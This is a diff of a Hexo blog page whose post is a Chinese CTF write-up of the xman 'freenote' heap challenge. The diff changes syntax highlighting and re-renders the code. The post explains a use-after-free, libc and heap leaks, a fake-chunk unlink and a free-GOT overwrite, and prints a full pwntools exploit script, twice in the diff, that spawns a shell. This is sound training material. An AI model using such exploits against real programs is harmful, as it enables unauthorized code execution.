@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="xman夏令营 freenote​    这道题做了一天半，最后终于搞出来了。有很多细节需要注意下。">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -318,9 +318,113 @@
         <h2 id="xman夏令营-freenote"><a href="#xman夏令营-freenote" class="headerlink" title="xman夏令营 freenote"></a>xman夏令营 freenote</h2><p>​    这道题做了一天半，最后终于搞出来了。有很多细节需要注意下。  </p>
 <a id="more"></a>
 <p>拿到题目看是freenote肯定就是个堆题，也没看保护直接ida一波走起，大略的看了一下很快发现了漏洞，在delete函数中free掉chunk后没有在chunk list对应的index中置null，导致有个野指针指向了free chunk。<br>​    一个野指针能做什么，一开始想的是能否通过double free造一个任意地址写，不过发现这题没有溢出，而且它的new函数中规定你malloc的chunk大小必须为0x80的整数，这样连fastbin都没有了，所以干脆放弃了fastbin attack的思路。<br>接着想0x80的整数倍，那么它free的时候会先放到unsorted bin中，chunk的fd和bk会指向main_arena，此时如果我们再new一个8字节的padding，因为不是0x80的倍数，所以默认分配0x80大小的chunk，覆盖原来free掉的chunk，就可以泄露main_arena的值，也就是原free chunk的bk（其实最后一个字节是固定的，也可以泄露fd）。一旦我们get到unsorted bin的表头地址，因为偏移固定，所以我们可以计算出libc基址，这样的话system和binsh等一些东西的地址就知道了。<br>接下来就是解题的关键所在，知道libc后我们该如何继续去做，看一下edit函数，发现它的逻辑是如果新的输入长度大小原来的输入长度，就会在新的位置realloc一个chunk，如果小于原来的长度才能覆盖原来的chunk。好像也没啥问题，反正就是不能溢出，直接改free chunk的fd和bk不现实，这时候考虑到使用unlink，通过伪造fake chunk来修改chunk list中的值，最后利用edit函数进行修改，很完美，应该就是这种思路。<br>​    得知要利用unlink的时候可以想到，首先要知道目标fd和bk的地址，这里由于chunk list是构造在堆上的，所以地址需要泄露，如何泄露，还是unsorted bin，和泄露libc一样的思路，只不过这里需要malloc 4个chunk，delete两个chunk使之有对应的fd和bk，而且delete chunk的顺序需要注意下，防止top chunk从后面进行合并。这样的话我们第一个chunk的指针就能泄露了。由于程序在一开始malloc了一个0x1810大小的chunk，所以偏移可以说是固定的，得到的first allocated chunk的堆地址减去0x1810后得到的就是chunk list  ptr的地址了。<br>​    最后考虑unlink，需要注意的是之前每次泄露之后都需要清理下chunk，让top进行合并，否则堆结构被破坏会报一些奇怪的错。<br>​    unlink这里的操作是先malloc一个大一点的chunk，可以是0x80<em>2或0x80</em>3，然后在这块大的chunk中构造两个正常的0x80大小的chunk，一个fake chunk，一个正常chunk，这里由于是在一个堆快内，所以元数据可以任意进行构造，构造完成之后delete第二个堆快，因为chunk list中的指针并没有置null，所以这里可以free掉第二个chunk构造unlink。<br>​    unlink的时候会有检查，包括size和fd、bk，p-&gt;size==(p-&gt;nextchunk).prevsize,p==(p-&gt;fd)-&gt;bk,p==(p-&gt;bk)-&gt;fd,基本就这样，这个可以根据chunk list的堆结构比划一下，应该不难构造。<br>unlink完成后chunk list就能写了，使用程序自带的edit函数先把free got写入，之后再次edit写system。一开始想的是写atoi，但是atoi在edit中有使用，所以就去写free got了，这里应该也可以one_gadget，待会再试一下。<br>​    总的来说这道题还是有点烦的，当然也是我水平不够，没有一眼就看出如何利用，导致审洞+写exp花了很长时间，继续加油吧。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./freenote'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./freenote'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'''</span></span><br><span class="line"><span class="comment">#	break *0x00000000004010A8</span></span><br><span class="line"><span class="comment">#	continue</span></span><br><span class="line"><span class="comment">#''')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">	p.sendline(str(len(x)))</span><br><span class="line">	p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    p.send(<span class="string">"3\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Note number: "</span>)</span><br><span class="line">    p.send(str(x)+<span class="string">"\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Length of note: "</span>)</span><br><span class="line">    p.send(str(len(y))+<span class="string">"\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter your note: "</span>)</span><br><span class="line">    p.send(y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak the libc</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">'\x78'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'0. '</span>)</span><br><span class="line"><span class="comment">#main_arena=p.recv(6)[::-1]</span></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'main_arena &gt; '</span>+hex(main_arena))</span><br><span class="line">libc_base=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">'libc_base &gt; '</span>+hex(libc_base))</span><br><span class="line">system_address=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_address=libc_base+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">log.info(<span class="string">'system_address &gt; '</span>+hex(system_address))</span><br><span class="line">log.info(<span class="string">'binsh_address &gt; '</span>+hex(binsh_address))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)   <span class="comment">#top chunk merge</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak the chunk list ptr</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'0. AAAAAAAA'</span>)</span><br><span class="line">heap_address=(u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">heap=heap_address<span class="number">-0x1810</span></span><br><span class="line"><span class="comment">#print hex(heap_address)</span></span><br><span class="line">log.info(<span class="string">'heap_chunk_ptr &gt; '</span>+hex(heap))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#clear the chunk / top chunk merge</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line"><span class="comment">#add(0x80*'a')</span></span><br><span class="line"><span class="comment">#add(0x80*'b')</span></span><br><span class="line"><span class="comment">#add(0x80*'c')</span></span><br><span class="line"><span class="comment">#dele(2)</span></span><br><span class="line"><span class="comment">#dele(1)</span></span><br><span class="line"><span class="comment">#dele(0) #top chunk merge / convert is ok</span></span><br><span class="line">payload=(p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(heap+<span class="number">0x8</span>)+p64(heap+<span class="number">0x10</span>)+<span class="string">'0'</span>*<span class="number">0x60</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)+<span class="string">'1'</span>*<span class="number">0x80</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>+<span class="number">0x11</span>)+<span class="string">"1"</span>*(<span class="number">0x80</span><span class="number">-0x20</span>)</span><br><span class="line">add(payload)</span><br><span class="line">log.info(<span class="string">'heap &gt; '</span>+hex(heap))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">atoi_address=elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">log.info(<span class="string">'atoi_got &gt; '</span>+hex(atoi_address))</span><br><span class="line"><span class="comment">#log.info('heap &gt; '+hex(heap))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">#p.sednline(p64(0x0)+p64(1)+p64(0x80)+p64(system_address))</span></span><br><span class="line"><span class="string">payload2=p64(0x80)+p64(1)+p64(0x8)+ p64(atoi_address)+"A"*16+p64(binsh_address)</span></span><br><span class="line"><span class="string">payload2+="A"*(0x60*3-len(payload2))</span></span><br><span class="line"><span class="string">edit(0,payload2)</span></span><br><span class="line"><span class="string">edit(0,p64(system_address))</span></span><br><span class="line"><span class="string">p.recvuntil("Your choice: ")</span></span><br><span class="line"><span class="string">p.sendline('/bin/sh\x00')  #edit function used atoi so you could not write atoi got</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">payload2 = p64(<span class="number">0x80</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x8</span>) + p64(free_got) + <span class="string">"A"</span>*<span class="number">16</span> + p64(binsh_address)</span><br><span class="line">payload2 += <span class="string">"A"</span>* (<span class="number">0x80</span>*<span class="number">3</span>-len(payload2))</span><br><span class="line">edit(<span class="number">0</span>, payload2)</span><br><span class="line">edit(<span class="number">0</span>, p64(system_address))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>from pwn import *
+p=process(&#39;./freenote&#39;)
+elf=ELF(&#39;./freenote&#39;)
+libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+#gdb.attach(p,&#39;&#39;&#39;
+#    break *0x00000000004010A8
+#    continue
+#&#39;&#39;&#39;)
+
+def add(x):
+    p.recvuntil(&#39;Your choice: &#39;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;Length of new note: &#39;)
+    p.sendline(str(len(x)))
+    p.recvuntil(&#39;Enter your note: &#39;)
+    p.sendline(x)
+
+def show():
+    p.recvuntil(&#39;Your choice: &#39;)
+    p.sendline(&#39;1&#39;)
+
+def edit(x,y):
+    p.recvuntil(&quot;Your choice: &quot;)
+    p.send(&quot;3\n&quot;)
+    p.recvuntil(&quot;Note number: &quot;)
+    p.send(str(x)+&quot;\n&quot;)
+    p.recvuntil(&quot;Length of note: &quot;)
+    p.send(str(len(y))+&quot;\n&quot;)
+    p.recvuntil(&quot;Enter your note: &quot;)
+    p.send(y)
 
 
+def dele(idx):
+    p.recvuntil(&#39;Your choice: &#39;)
+    p.sendline(&#39;4&#39;)
+    p.recvuntil(&#39;Note number: &#39;)
+    p.sendline(str(idx))
+
+#leak the libc
+add(&#39;a&#39;*0x80)
+add(&#39;b&#39;*0x80)
+dele(0)
+add(&#39;\x78&#39;)
+show()
+p.recvuntil(&#39;0. &#39;)
+#main_arena=p.recv(6)[::-1]
+main_arena=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+log.info(&#39;main_arena &gt; &#39;+hex(main_arena))
+libc_base=main_arena-0x3c4b78
+log.info(&#39;libc_base &gt; &#39;+hex(libc_base))
+system_address=libc_base+libc.symbols[&#39;system&#39;]
+binsh_address=libc_base+libc.search(&#39;/bin/sh&#39;).next()
+log.info(&#39;system_address &gt; &#39;+hex(system_address))
+log.info(&#39;binsh_address &gt; &#39;+hex(binsh_address))
+
+dele(1)
+dele(0)   #top chunk merge
+
+#leak the chunk list ptr
+add(&#39;a&#39;*0x80) #0
+add(&#39;b&#39;*0x80)
+add(&#39;c&#39;*0x80) #2
+add(&#39;d&#39;*0x80)
+dele(2)
+dele(0)
+add(&#39;A&#39;*8)
+show()
+p.recvuntil(&#39;0. AAAAAAAA&#39;)
+heap_address=(u64(p.recv(4).ljust(8,&#39;\x00&#39;)))
+heap=heap_address-0x1810
+#print hex(heap_address)
+log.info(&#39;heap_chunk_ptr &gt; &#39;+hex(heap))
+dele(3)
+dele(0)
+dele(1) #clear the chunk / top chunk merge
+
+#unlink
+#add(0x80*&#39;a&#39;)
+#add(0x80*&#39;b&#39;)
+#add(0x80*&#39;c&#39;)
+#dele(2)
+#dele(1)
+#dele(0) #top chunk merge / convert is ok
+payload=(p64(0)+p64(0x81)+p64(heap+0x8)+p64(heap+0x10)+&#39;0&#39;*0x60+p64(0x80)+p64(0x90)+&#39;1&#39;*0x80)+p64(0)+p64(0x80+0x11)+&quot;1&quot;*(0x80-0x20)
+add(payload)
+log.info(&#39;heap &gt; &#39;+hex(heap))
+dele(1)
+atoi_address=elf.got[&#39;atoi&#39;]
+log.info(&#39;atoi_got &gt; &#39;+hex(atoi_address))
+#log.info(&#39;heap &gt; &#39;+hex(heap))
+&#39;&#39;&#39;
+#p.sednline(p64(0x0)+p64(1)+p64(0x80)+p64(system_address))
+payload2=p64(0x80)+p64(1)+p64(0x8)+ p64(atoi_address)+&quot;A&quot;*16+p64(binsh_address)
+payload2+=&quot;A&quot;*(0x60*3-len(payload2))
+edit(0,payload2)
+edit(0,p64(system_address))
+p.recvuntil(&quot;Your choice: &quot;)
+p.sendline(&#39;/bin/sh\x00&#39;)  #edit function used atoi so you could not write atoi got
+&#39;&#39;&#39;
+free_got = 0x602018
+payload2 = p64(0x80) + p64(1) + p64(0x8) + p64(free_got) + &quot;A&quot;*16 + p64(binsh_address)
+payload2 += &quot;A&quot;* (0x80*3-len(payload2))
+edit(0, payload2)
+edit(0, p64(system_address))
+dele(1)
+p.interactive()
+</code></pre>
     </div>
 
     
@@ -425,6 +529,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
